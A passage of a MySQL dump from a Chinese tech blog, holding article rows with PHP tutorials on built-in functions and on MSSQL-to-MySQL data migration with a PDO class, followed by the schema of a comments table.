target=\"_blank\" title=\"高并发简单解决方案 | 靠谱崔小拽\">高并发简单解决方案 | 靠谱崔小拽 </a><br/></p><p><a href=\"http://my.oschina.net/u/1995545/blog/360307\" target=\"_blank\" title=\"数据库水平切分的实现原理\">数据库水平切分的实现原理</a><br/></p><p><a href=\"https://segmentfault.com/a/1190000004708640\" target=\"_blank\" title=\"用Nginx实现session共享的均衡负载\">用Nginx实现session共享的均衡负载</a></p><p><a href=\"http://blog.csdn.net/hguisu/article/details/7325124/\" target=\"_blank\" title=\"高性能Mysql主从架构的复制原理及配置详解\">高性能Mysql主从架构的复制原理及配置详解</a><br/></p>',1459501058,'2016-12-16 14:02:44','0000-00-00 00:00:00',5,0,2,6,'http://7xq09h.com1.z0.glb.clouddn.com/145983967710.jpg?imageView2/1/w/210/h/140'),(128,0,'php','一只特立独行的猪2号','非常实用的PHP方法以及代码块（常更新）','本文章记录那些非常实用的PHP方法，以及代码功能块。比如：传递任意数量的函数参数，使用glob()和scandir()查找文件和文件夹，获取系统常量，生成唯一的一个编号，序列化和反序列化，页面跳转的几种技巧...','实用的PHP方法以及代码块','实用的PHP方法以及代码块，本文章记录那些非常实用的PHP方法，以及代码功能块。','实用，PHP方法','PHP方法',273,'<p style=\"white-space: normal;\"><img style=\"border-radius:4px\" src=\"http://7xq09h.com1.z0.glb.clouddn.com/qimg_1460707589360271.jpg\" title=\"1460707589360271.jpg\" alt=\"4.jpg\"/></p><p style=\"white-space: normal;\">本文章记录那些非常实用的PHP方法，以及代码功能块。</p><h2 style=\"white-space: normal;\">传递任意数量的函数参数</h2><p style=\"white-space: normal;\">我们在.NET或者JAVA编程中，一般函数参数个数都是固定的，但是PHP允许你使用任意个数的参数。下面这个示例向你展示了PHP<code>func_get_args()</code>函数的默认参数:</p><pre><code class=\"language-css\">function&nbsp;foo()&nbsp;{&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;//取得所有的传入参数的数组&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;$args&nbsp;=&nbsp;func_get_args();&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;foreach&nbsp;($args&nbsp;as&nbsp;$k&nbsp;=&gt;&nbsp;$v)&nbsp;{&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;“arg”.($k+1).”:&nbsp;$v\\n”;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;\r\n}&nbsp;&nbsp;\r\nfoo();&nbsp;//什么也不会输出\r\nfoo(‘hello’);//&nbsp;输出&nbsp;arg1:&nbsp;hello&nbsp;\r\nfoo(‘hello’,&nbsp;‘world’,&nbsp;‘again’);&nbsp;&nbsp;\r\n/*&nbsp;输出&nbsp;\r\narg1:&nbsp;hello&nbsp;\r\narg2:&nbsp;world&nbsp;\r\narg3:&nbsp;again&nbsp;\r\n*/</code></pre><h2 style=\"white-space: normal;\">使用glob()和scandir()查找文件和文件夹</h2><p style=\"white-space: normal;\">大部分PHP函数的函数名从字面上都可以理解其用途，但是当你看到<code>glob()&nbsp;</code>的时候，你也许并不知道这是用来做什么的，其实<code>glob()&nbsp;</code>和<code>scandir()&nbsp;</code>一样，可以用来查找文件，请看下面的用法：</p><pre><code class=\"language-css\">$files&nbsp;=&nbsp;glob(&#39;*.php&#39;);&nbsp;//取得当前文件夹后缀为.php的文件\r\n$files&nbsp;=&nbsp;glob(&#39;*.{php,txt}&#39;,&nbsp;GLOB_BRACE);&nbsp;//取得当前文件夹后缀为.php和.txt的文件\r\n$files&nbsp;=&nbsp;glob(&#39;../images/*.jpg&#39;);&nbsp;&nbsp;//取得当前文件夹同级的images文件夹后缀为.jpg的文件\r\n$files&nbsp;=&nbsp;array_map(&#39;realpath&#39;,glob(&#39;../images/a*.jpg&#39;));&nbsp;&nbsp;//取得当前文件夹同级的images文件夹名称为a开头的jpg文件\r\n$files&nbsp;=&nbsp;scandir(dirname(__FILE__))&nbsp;//得到一个当前文件夹下所有文件名称、文件夹名称以及&#39;.&#39;和&#39;..&#39;组成的数组</code></pre><p style=\"white-space: normal;\">更深层次的运用，获取一个文件夹下所有的文件名和文件夹名的两种方法：</p><pre><code class=\"language-css\">$hostdir&nbsp;=&nbsp;&quot;F:\\Apache24\\htdocs\\yii&quot;;\r\n\r\nfunction&nbsp;ScanfetchDir($dir){\r\n&nbsp;&nbsp;&nbsp;&nbsp;$filesnames&nbsp;=&nbsp;scandir($dir);\r\n&nbsp;&nbsp;&nbsp;&nbsp;foreach&nbsp;($filesnames&nbsp;as&nbsp;$name)&nbsp;{\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if($name&nbsp;!=&nbsp;&#39;.&#39;&nbsp;&amp;&amp;&nbsp;$name&nbsp;!=&nbsp;&#39;..&#39;){\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(is_dir($dir.&#39;\\\\&#39;.$name)){\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;&quot;文件夹&quot;.$dir.&#39;\\\\&#39;.$name.&quot;\\n&quot;;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ScanfetchDir($dir.&#39;\\\\&#39;.$name);\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}else{\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;$name.&quot;\\n&quot;;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}\r\n&nbsp;&nbsp;&nbsp;&nbsp;}\r\n}\r\n//此方法取出格式为:\r\n//文件夹F:\\Apache24\\htdocs\\yii\\advanced\\vendor\\yiisoft\\yii2\\rest&nbsp;&nbsp;&nbsp;&nbsp;\r\n//Action.php&nbsp;&nbsp;&nbsp;&nbsp;\r\n\r\nfunction&nbsp;fetchDir($dir)&nbsp;{&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;foreach(glob($dir.&#39;\\*&#39;)&nbsp;as&nbsp;$file)&nbsp;{&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;is_file($file)&nbsp;?&nbsp;$file.&quot;\\n&quot;&nbsp;:&nbsp;&quot;文件夹&quot;.$file.&quot;\\n&quot;;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(is_dir($file))&nbsp;{&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fetchDir($file);&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;\r\n}\r\n//此方法取出格式为（文件全路径）:\r\n//文件夹F:\\Apache24\\htdocs\\yii\\advanced\\vendor\\yiisoft\\yii2\\views&nbsp;&nbsp;&nbsp;&nbsp;\r\n//F:\\Apache24\\htdocs\\yii\\advanced\\vendor\\yiisoft\\yii2\\views\\addColumnMigration.php&nbsp;&nbsp;&nbsp;&nbsp;\r\n\r\n//fetchDir($hostdir);\r\nScanfetchDir($hostdir);</code></pre><h2 style=\"white-space: normal;\">获取系统常量</h2><p style=\"white-space: normal;\">PHP 提供非常有用的系统常量 可以让你得到当前的行号 (__LINE__)，文件 (__FILE__)，目录 (__DIR__)，函数名 (__FUNCTION__)，类名(__CLASS__)，方法名(__METHOD__) 和名字空间 (__NAMESPACE__)，很像C语言。我们可以以为这些东西主要是用于调试，当也不一定，比如我们可以在include其它文件的时候使用?__FILE__ (当然，你也可以在 PHP 5.3以后使用 __DIR__)，下面是例子:</p><pre><code class=\"language-css\">echo&nbsp;__LINE__.&quot;\\n&quot;;&nbsp;//行数，输出5\r\necho&nbsp;__FILE__.&quot;\\n&quot;;&nbsp;//文件全路径，输出F:\\Apache24\\htdocs\\yii\\test.php\r\necho&nbsp;__DIR__.&quot;\\n&quot;;&nbsp;//文件所在文件夹，输出F:\\Apache24\\htdocs\\yii\r\necho&nbsp;dirname(__FILE__).&quot;\\n&quot;;&nbsp;//文件所在文件夹（跟上一个一样，dirname()会逐级的向上去文件夹），输出F:\\Apache24\\htdocs\\yii\r\n\r\nclass&nbsp;Txet{\r\n&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;static&nbsp;function&nbsp;CesText(){\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;__CLASS__.&quot;\\n&quot;;&nbsp;//类名，输出Txet\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;__FUNCTION__.&quot;\\n&quot;;&nbsp;//函数名，输出CesText\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;__METHOD__.&quot;\\n&quot;;&nbsp;//方法名（应该是调用的方法），输出Txet::CesText\r\n&nbsp;&nbsp;&nbsp;&nbsp;}\r\n}\r\nTxet::CesText();</code></pre><h2 style=\"white-space: normal;\">生成唯一的一个编号</h2><p style=\"white-space: normal;\">很多人都利用md5()来生成唯一的编号，但是md5()有几个缺点：</p><ul class=\" list-paddingleft-2\" style=\"width: 1187.5px; white-space: normal;\"><li><p>无序，导致数据库中排序性能下降。</p></li><li><p>太长，需要更多的存储空间。</p></li></ul><p style=\"white-space: normal;\">其实PHP中自带一个函数来生成唯一的id，这个函数就是uniqid()。下面是用法：&nbsp;</p><pre><code class=\"language-css\">echo&nbsp;uniqid();&nbsp;//输出:57109a267270e</code></pre><p style=\"white-space: normal;\">该算法是根据CPU时间戳来生成的，所以在相近的时间段内，id前几位是一样的，这也方便id的排序，如果你想更好的避免重复，可以在id前加上前缀，如:</p><pre><code class=\"language-css\">echo&nbsp;uniqid(&#39;Alice_&#39;);&nbsp;//输出:Alice_57109ad9af79e\r\necho&nbsp;uniqid(&#39;Alice_&#39;,&nbsp;true);;&nbsp;//输出:Alice_57109b0f53ec63.40241815</code></pre><h2 style=\"white-space: normal;\">序列化和反序列化</h2><p style=\"white-space: normal;\">PHP序列化功能大家可能用的比较多，也比较常见，当你需要把数据存到数据库或者文件中是，你可以利用PHP中的<code>serialize()</code>和<code>unserialize()</code>方法来实现序列化和反序列化，如果是Json格式在PHP5.2以上版本的用户可以使用<code>json_encode()</code>和<code>json_decode()</code>函数来实现json格式的序列化。代码如下：&nbsp;</p><pre><code class=\"language-css\">$arr&nbsp;=&nbsp;[&#39;temp&#39;,&nbsp;123,&nbsp;[&#39;45&#39;,&nbsp;&#39;nihao&#39;],&nbsp;&#39;蛤蛤&#39;];\r\n$string&nbsp;=&nbsp;serialize($arr);\r\n$jsonatr&nbsp;=&nbsp;json_encode($arr);\r\necho&nbsp;$string;\r\necho&nbsp;$jsonatr;\r\n//输出\r\na:4:{i:0;s:4:&quot;temp&quot;;i:1;i:123;i:2;a:2:{i:0;s:2:&quot;45&quot;;i:1;s:5:&quot;nihao&quot;;}i:3;s:6:&quot;蛤蛤&quot;;}\r\n[&quot;temp&quot;,123,[&quot;45&quot;,&quot;nihao&quot;],&quot;\\u86e4\\u86e4&quot;]\r\n\r\n//反序列化unserialize和json_decode几乎一样\r\n$outarr&nbsp;=&nbsp;unserialize($string);\r\nvar_dump($outarr);\r\n//输出\r\narray(4)&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;\r\n[0]=&gt;&nbsp;&nbsp;&nbsp;&nbsp;\r\nstring(4)&nbsp;&quot;temp&quot;&nbsp;&nbsp;&nbsp;&nbsp;\r\n[1]=&gt;&nbsp;&nbsp;&nbsp;&nbsp;\r\nint(123)&nbsp;&nbsp;&nbsp;&nbsp;\r\n[2]=&gt;&nbsp;&nbsp;&nbsp;&nbsp;\r\narray(2)&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;\r\n[0]=&gt;&nbsp;&nbsp;&nbsp;&nbsp;\r\nstring(2)&nbsp;&quot;45&quot;&nbsp;&nbsp;&nbsp;&nbsp;\r\n[1]=&gt;&nbsp;&nbsp;&nbsp;&nbsp;\r\nstring(5)&nbsp;&quot;nihao&quot;&nbsp;&nbsp;&nbsp;&nbsp;\r\n}&nbsp;&nbsp;&nbsp;&nbsp;\r\n[3]=&gt;&nbsp;&nbsp;&nbsp;&nbsp;\r\nstring(6)&nbsp;&quot;蛤蛤&quot;&nbsp;&nbsp;&nbsp;&nbsp;\r\n}</code></pre><h2 style=\"white-space: normal;\">字符串压缩</h2><p style=\"white-space: normal;\">当我们说到压缩，我们可能会想到文件压缩，其实，字符串也是可以压缩的。PHP提供了<code>gzcompress()</code>和<code>gzuncompress()</code>函数:</p><pre><code class=\"language-css\">$string&nbsp;=&nbsp;&nbsp;\r\n“Lorem&nbsp;ipsum&nbsp;dolor&nbsp;sit&nbsp;amet,&nbsp;consectetur&nbsp;&nbsp;\r\nadipiscing&nbsp;elit.&nbsp;Nunc&nbsp;ut&nbsp;elit&nbsp;id&nbsp;mi&nbsp;ultricies&nbsp;&nbsp;\r\nadipiscing.&nbsp;Nulla&nbsp;facilisi.&nbsp;Praesent&nbsp;pulvinar,&nbsp;&nbsp;\r\nsapien&nbsp;vel&nbsp;feugiat&nbsp;vestibulum,&nbsp;nulla&nbsp;dui&nbsp;pretium&nbsp;orci,&nbsp;&nbsp;\r\nnon&nbsp;ultricies&nbsp;elit&nbsp;lacus&nbsp;quis&nbsp;ante.&nbsp;Lorem&nbsp;ipsum&nbsp;dolor&nbsp;&nbsp;\r\nsit&nbsp;amet,&nbsp;consectetur&nbsp;adipiscing&nbsp;elit.&nbsp;Aliquam&nbsp;&nbsp;\r\npretium&nbsp;ullamcorper&nbsp;urna&nbsp;quis&nbsp;iaculis.&nbsp;Etiam&nbsp;ac&nbsp;massa&nbsp;&nbsp;\r\nsed&nbsp;turpis&nbsp;tempor&nbsp;luctus.&nbsp;Curabitur&nbsp;sed&nbsp;nibh&nbsp;eu&nbsp;elit&nbsp;&nbsp;\r\nmollis&nbsp;congue.&nbsp;Praesent&nbsp;ipsum&nbsp;diam,&nbsp;consectetur&nbsp;vitae&nbsp;&nbsp;\r\nornare&nbsp;a,&nbsp;aliquam&nbsp;a&nbsp;nunc.&nbsp;In&nbsp;id&nbsp;magna&nbsp;pellentesque&nbsp;&nbsp;\r\ntellus&nbsp;posuere&nbsp;adipiscing.&nbsp;Sed&nbsp;non&nbsp;mi&nbsp;metus,&nbsp;at&nbsp;lacinia&nbsp;&nbsp;\r\naugue.&nbsp;Sed&nbsp;magna&nbsp;nisi,&nbsp;ornare&nbsp;in&nbsp;mollis&nbsp;in,&nbsp;mollis&nbsp;&nbsp;\r\nsed&nbsp;nunc.&nbsp;Etiam&nbsp;at&nbsp;justo&nbsp;in&nbsp;leo&nbsp;congue&nbsp;mollis.&nbsp;&nbsp;\r\nNullam&nbsp;in&nbsp;neque&nbsp;eget&nbsp;metus&nbsp;hendrerit&nbsp;scelerisque&nbsp;&nbsp;\r\neu&nbsp;non&nbsp;enim.&nbsp;Ut&nbsp;malesuada&nbsp;lacus&nbsp;eu&nbsp;nulla&nbsp;bibendum&nbsp;&nbsp;\r\nid&nbsp;euismod&nbsp;urna&nbsp;sodales.&nbsp;“;&nbsp;&nbsp;\r\n$compressed&nbsp;=&nbsp;gzcompress($string);&nbsp;&nbsp;\r\necho&nbsp;“Original&nbsp;size:&nbsp;“.&nbsp;strlen($string).”\\n”;&nbsp;//&nbsp;输出原始大小&nbsp;Original&nbsp;size:&nbsp;800&nbsp;\r\necho&nbsp;“Compressed&nbsp;size:&nbsp;“.&nbsp;strlen($compressed).”\\n”;&nbsp;//&nbsp;输出压缩后的大小Compressed&nbsp;size:&nbsp;418&nbsp;&nbsp;\r\n//&nbsp;解压缩，几乎有50%&nbsp;压缩比率。同时，你还可以使用&nbsp;gzencode()&nbsp;和&nbsp;gzdecode()&nbsp;函数来压缩，只不用其用了不同的压缩算法。\r\n$original&nbsp;=&nbsp;gzuncompress($compressed);</code></pre><p style=\"white-space: normal;\">待更新...</p><p style=\"white-space: normal;\">参考文章：</p><p style=\"white-space: normal;\"><a href=\"http://www.php100.com/html/php/rumen/2013/1028/6331.html\" target=\"_blank\" title=\"8 个必备的PHP功能开发\">8 个必备的PHP功能开发</a></p><p style=\"white-space: normal;\"><a href=\"http://www.rm5u.com/\" target=\"_blank\" title=\"入门无忧网\">入门无忧网</a><br/></p><p><br/></p>',1460707624,'2016-11-02 13:53:08','0000-00-00 00:00:00',2,0,2,6,'http://7xq09h.com1.z0.glb.clouddn.com/qimg_1460707589360271.jpg?imageView2/1/w/210/h/140'),(129,0,'backend','一只特立独行的猪2号','利用代码来迁移数据（Php/Python）','因为工作做过几次网站的数据迁移，这个过程没多大技术难点，就是分析一些字段比较花时间吧，这里记录一下代码和过程，可能以后会用到。','利用代码来迁移数据','利用代码来迁移数据包括php和python代码...','迁移数据','数据',170,'<p><img style=\"border-radius:4px\" src=\"http://7xq09h.com1.z0.glb.clouddn.com/qimg_1465723644814343.jpg\" title=\"1465723644814343.jpg\" alt=\"2.jpg\"/></p><p>因为工作做过几次网站的数据迁移，这个过程没多大技术难点，就是分析一些字段比较花时间吧，这里记录一下代码和过程，可能以后会用到。</p><p>举个例子，上次刚做了一个数据迁移，大体就是有客户网站需要换成我们公司的产品(08cms)需要将部分数据迁移过来，对方数据库是Mssql要迁移到Mysql，用的是php先说php的代码吧。既然是两个不同的数据库，那肯定是用PDO啦，这个是主流，不多说以下是代码</p><h3>数据库连接类</h3><pre><code class=\"language-css\">class&nbsp;LinkDb{\r\n\r\n&nbsp;&nbsp;&nbsp;&nbsp;#是否开启打印错误信息\r\n&nbsp;&nbsp;&nbsp;&nbsp;private&nbsp;$sqlDebug&nbsp;=&nbsp;TRUE;\r\n&nbsp;&nbsp;&nbsp;&nbsp;#数据库操作主对象\r\n&nbsp;&nbsp;&nbsp;&nbsp;private&nbsp;$pdo&nbsp;=&nbsp;null;\r\n&nbsp;&nbsp;&nbsp;&nbsp;#PDO参数\r\n&nbsp;&nbsp;&nbsp;&nbsp;private&nbsp;$option&nbsp;=&nbsp;array(&#39;option&#39;&nbsp;=&gt;&nbsp;array());\r\n&nbsp;&nbsp;&nbsp;&nbsp;#单例模式保存对象\r\n&nbsp;&nbsp;&nbsp;&nbsp;private&nbsp;static&nbsp;$instance&nbsp;=&nbsp;null;\r\n\r\n&nbsp;&nbsp;&nbsp;&nbsp;#对应单例模式防止产生新的对象，严格的话还要加上__clone()\r\n&nbsp;&nbsp;&nbsp;&nbsp;private&nbsp;function&nbsp;__construct(){}\r\n&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;#PDO链接并生成主对象\r\n&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;function&nbsp;linkPdo($linkdsn,$user,$password){\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;option[&#39;link&#39;]&nbsp;=&nbsp;$linkdsn;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;option[&#39;user&#39;]&nbsp;=&nbsp;$user;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;option[&#39;password&#39;]&nbsp;=&nbsp;$password;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(!is_null($this-&gt;pdo))&nbsp;$this-&gt;pdo&nbsp;=&nbsp;null;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;getpdo();\r\n&nbsp;&nbsp;&nbsp;&nbsp;}\r\n&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;#设置PDO参数\r\n&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;function&nbsp;setOption(array&nbsp;$option){\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;option[&#39;option&#39;]&nbsp;=&nbsp;$option;\r\n&nbsp;&nbsp;&nbsp;&nbsp;}\r\n&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;#链接PDO\r\n&nbsp;&nbsp;&nbsp;&nbsp;private&nbsp;function&nbsp;getPdo(){\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try{\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;pdo&nbsp;=&nbsp;new&nbsp;PDO($this-&gt;option[&#39;link&#39;],$this-&gt;option[&#39;user&#39;],$this-&gt;option[&#39;password&#39;],$this-&gt;option[&#39;option&#39;]);\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;catch&nbsp;(PDOException&nbsp;$e)&nbsp;{\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;$e-&gt;getMessage();\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;die();\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}\r\n&nbsp;&nbsp;&nbsp;&nbsp;}\r\n&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;#单例模式主方法，获取对象调用本方法\r\n&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;static&nbsp;function&nbsp;getInstance(){\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(is_null(self::$instance)){\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self::$instance&nbsp;=&nbsp;new&nbsp;self;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;self::$instance;\r\n&nbsp;&nbsp;&nbsp;&nbsp;}\r\n&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;function&nbsp;query($sql){\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$result&nbsp;=&nbsp;$this-&gt;pdo-&gt;query($sql);\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if($result&nbsp;===&nbsp;false&nbsp;&amp;&amp;&nbsp;$this-&gt;sqlDebug){\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$error_info&nbsp;=&nbsp;$this-&gt;pdo-&gt;errorInfo();\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;&quot;SQL执行失败。&quot;,&nbsp;&quot;&lt;br&gt;&quot;;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;&quot;错误的消息为:&quot;,&nbsp;&quot;&lt;br&gt;&quot;,&nbsp;$error_info[2],&nbsp;&quot;&lt;br&gt;&quot;;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;&quot;错误的SQL:&quot;,&nbsp;&quot;&lt;br&gt;&quot;,&nbsp;$sql,&nbsp;&quot;&lt;br&gt;&quot;;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;die();\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;$result;\r\n&nbsp;&nbsp;&nbsp;&nbsp;}\r\n&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;function&nbsp;select($sql&nbsp;=&nbsp;&#39;&#39;){\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$result&nbsp;=&nbsp;$this-&gt;query($sql);\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$rows&nbsp;=&nbsp;$result-&gt;fetchAll(PDO::FETCH_ASSOC);\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$result-&gt;closeCursor();\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;$rows;\r\n&nbsp;&nbsp;&nbsp;&nbsp;}\r\n&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;function&nbsp;selectRow($sql&nbsp;=&nbsp;&#39;&#39;){\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$result&nbsp;=&nbsp;$this-&gt;query($sql);\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$row&nbsp;=&nbsp;$result-&gt;fetch(PDO::FETCH_ASSOC);\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$result-&gt;closeCursor();\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;$row;\r\n&nbsp;&nbsp;&nbsp;&nbsp;}\r\n&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;#获取最后一次插入数据的id\r\n&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;function&nbsp;getLastId(){\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;$this-&gt;pdo-&gt;lastInsertId();\r\n&nbsp;&nbsp;&nbsp;&nbsp;}\r\n&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;#防止sql注入的(对敏感字符编码)，这里可有可无吧&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;function&nbsp;escapeMysqlString($str&nbsp;=&nbsp;&#39;&#39;){\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;$this-&gt;pdo-&gt;quote($str);\r\n&nbsp;&nbsp;&nbsp;&nbsp;}\r\n}</code></pre><p>好忙，连写博客都没时间。待更新...</p>',1465723694,'2016-11-15 16:41:54','0000-00-00 00:00:00',1,0,2,6,'http://7xq09h.com1.z0.glb.clouddn.com/qimg_1465723644814343.jpg?imageView2/1/w/210/h/140');
/*!40000 ALTER TABLE `info_article` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `info_comment`
--

DROP TABLE IF EXISTS `info_comment`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `info_comment` (
  `id` int(11) NOT NULL AUTO_INCREMENT COMMENT '评论ID',
  `cid` int(11) NOT NULL COMMENT '所属评论',
  `aid` int(11) NOT NULL COMMENT '所属文章ID',
  `contents` text NOT NULL COMMENT '评论内容',
  `nickname` varchar(50) NOT NULL COMMENT '用户的昵称',
  `email` varchar(100) NOT NULL COMMENT '邮箱地址',
  `website` varchar(200) NOT NULL COMMENT '个人主页地址',
  `ctime` int(11) NOT NULL COMMENT '创建时间',
  `parent` varchar(64) NOT NULL,
  `ip` varchar(64) NOT NULL,
  `updated_at` datetime NOT NULL,
  `created_at` datetime NOT NULL,
  PRIMARY KEY (`id`),
  KEY `aid` (`aid`),
  KEY `created_at` (`created_at`)
) ENGINE=MyISAM AUTO_INCREMENT=308 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `info_comment`
--

LOCK TABLES `info_comment` WRITE;
